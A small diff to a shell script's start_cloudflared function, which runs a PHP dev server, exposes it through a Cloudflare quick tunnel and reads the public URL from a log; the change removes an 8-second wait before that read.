@@ -242,7 +242,6 @@ start_cloudflared() {
     php -S "$HOST:$PORT" > /dev/null 2>&1 &
     sleep 5
     cloudflared tunnel --url "http://$HOST:$PORT" > .cfurl.log 2>&1 &
-    sleep 8
 
     URL=$(grep -o 'https://[-a-zA-Z0-9]*\.trycloudflare.com' .cfurl.log | head -n 1)
 if [[ $URL ]]; then
